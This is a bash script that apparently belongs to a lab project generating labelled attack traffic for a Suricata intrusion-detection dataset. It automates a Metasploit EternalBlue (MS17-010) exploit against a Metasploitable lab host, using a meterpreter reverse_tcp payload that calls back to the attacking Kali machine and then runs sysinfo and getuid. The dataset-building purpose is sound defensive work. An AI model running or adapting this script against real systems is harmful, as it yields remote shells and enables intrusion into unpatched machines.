#!/bin/bash
# ============================================================
# metasploit_ms17010.sh
# Attack Type: Remote code execution via EternalBlue (MS17-010)
# Tool: Metasploit Framework (msfconsole)
# Source: Kali Linux (192.168.20.20)
# Target: Metasploitable (192.168.30.20)
#
# What this does:
#   Attempts to exploit the MS17-010 SMB vulnerability
#   (EternalBlue). This is the same exploit used by WannaCry
#   ransomware in 2017. It targets unpatched SMB services on
#   Windows and some Linux Samba configurations.
#
#   If successful: establishes a reverse shell (target connects
#   back to Kali, giving command execution).
#   If unsuccessful: still generates rich exploit attempt
#   traffic that Suricata will flag.
#
# What Suricata will see:
#   ET EXPLOIT MS17-010 EternalBlue signatures
#   SMB transaction anomalies
#   Possible reverse shell connection traffic
#   Multiple high-severity alerts
#
# Note on success/failure:
#   This exploit may or may not succeed depending on
#   Metasploitable's SMB configuration. Either outcome is
#   fine for our dataset — we want the traffic, not the shell.
#
# Usage:
#   bash metasploit-ms17010.sh
#   (does NOT require root — msfconsole handles its own privs)
#
# After running, log this session in data/session_log.csv:
#   timestamp_start, timestamp_end, metasploit_ms17010,
#   192.168.30.20, malicious, success/failed + notes
# ============================================================

# ── Configuration ────────────────────────────────────────────
KALI_IP="192.168.20.20"         # Our IP — where reverse shell connects back to
TARGET_IP="192.168.30.20"       # Metasploitable
LPORT="4444"                    # Local port to listen on for reverse shell
OUTPUT_DIR="/tmp/msf_results"
mkdir -p "$OUTPUT_DIR"

TIMESTAMP=$(date '+%Y-%m-%d_%H-%M-%S')
LOG_FILE="${OUTPUT_DIR}/ms17010_${TIMESTAMP}.txt"

echo "============================================"
echo " Metasploit MS17-010 (EternalBlue)"
echo " Started:  $(date '+%Y-%m-%d %H:%M:%S')"
echo " Target:   ${TARGET_IP}"
echo " LHOST:    ${KALI_IP}"
echo " LPORT:    ${LPORT}"
echo "============================================"
echo ""
echo "[!] Record this start time in session_log.csv"
echo ""

# ── Run Metasploit via resource script ───────────────────────
# We use a "resource script" (.rc file) to automate msfconsole.
# A resource script is just a list of Metasploit commands that
# run sequentially — like a macro for msfconsole.
#
# Without this you'd have to type each command manually.
# With this the entire exploit runs automatically.

# Write the resource script to a temp file
cat > /tmp/ms17010.rc << EOF
# Tell Metasploit which exploit to use
# exploit/windows/smb/ms17_010_eternalblue is the EternalBlue module
use exploit/windows/smb/ms17_010_eternalblue

# Set the target — who we're attacking
set RHOSTS ${TARGET_IP}

# Set our IP — where the reverse shell calls back to
# LHOST = "Local Host" = attacker's IP
set LHOST ${KALI_IP}

# Set the port we listen on for the incoming shell
set LPORT ${LPORT}

# The payload — what runs on the target if exploit succeeds
# windows/x64/meterpreter/reverse_tcp:
#   - windows/x64    → 64-bit Windows shellcode
#   - meterpreter    → Metasploit's advanced shell (more features than basic shell)
#   - reverse_tcp    → target connects BACK to us (bypasses inbound firewalls)
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Show current settings before running
show options

# Run the exploit
# If it succeeds: drops into a meterpreter session
# If it fails: shows error and exits
run

# If we get a session, run a few commands to generate more traffic
# then exit cleanly
sysinfo
getuid
exit
EOF

# Run msfconsole with the resource script
# -q = quiet mode (skip banner)
# -r = run resource script
# -o = save output to log file
echo "[*] Launching Metasploit..."
msfconsole -q -r /tmp/ms17010.rc 2>&1 | tee "$LOG_FILE"

# ── Cleanup ──────────────────────────────────────────────────
rm -f /tmp/ms17010.rc

# ── Summary ──────────────────────────────────────────────────
echo ""
echo "============================================"
echo " Exploit attempt complete: $(date '+%Y-%m-%d %H:%M:%S')"
echo " Log saved to: ${LOG_FILE}"
echo "============================================"
echo ""
echo "[!] Record this end time in session_log.csv"
echo "[!] Label: malicious"
echo "[!] Scenario: metasploit_ms17010"
echo ""
echo "Check the log above for:"
echo "  - 'Meterpreter session opened' = exploit succeeded"
echo "  - 'Exploit completed, but no session' = failed (traffic still captured)"
echo "  - Either outcome is valid for the dataset"
